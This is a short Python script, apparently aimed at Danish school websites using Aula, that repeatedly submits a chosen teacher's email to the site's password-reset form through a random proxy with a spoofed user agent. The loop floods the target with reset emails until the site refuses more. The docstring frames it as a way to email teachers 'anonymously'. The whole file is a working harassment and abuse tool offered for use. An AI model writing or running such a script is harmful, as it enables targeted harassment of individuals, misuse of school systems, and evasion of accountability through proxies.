import requests
import random
from colorama import Fore

""" Send teachers emails through specified school websites using Aula, anonymously. """ 

# CONSTANTS
SCHOOL = ''
EMAIL = ''

# UTILITIES
user_agent = {'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36'}

proxy = set()

with open("proxies.txt", "r") as file:
    content = file.readlines()
    for random_line in content:
        proxy.add(random_line.strip())

proxies = {'http': 'http://'+random.choice(list(proxy))}


def Adgangskode_Spammer():

    while True:

        res = requests.post(
            f'{SCHOOL}/user/password', headers=user_agent, proxies=proxies,

            data = {
                'name'    : EMAIL,
                'form_id' : 'user_pass', 
                'op'      : 'Indsend'
            }
        )

        if 'Yderligere instruktioner' in res.text:
            print(f"{EMAIL} {Fore.RED}::{Fore.RESET} received e-mail.")

        else:
            print("Error (If the person isn't registered in Aula) / Done (If the person can't receive more password-resets) ...")
            return

          
Adgangskode_Spammer()
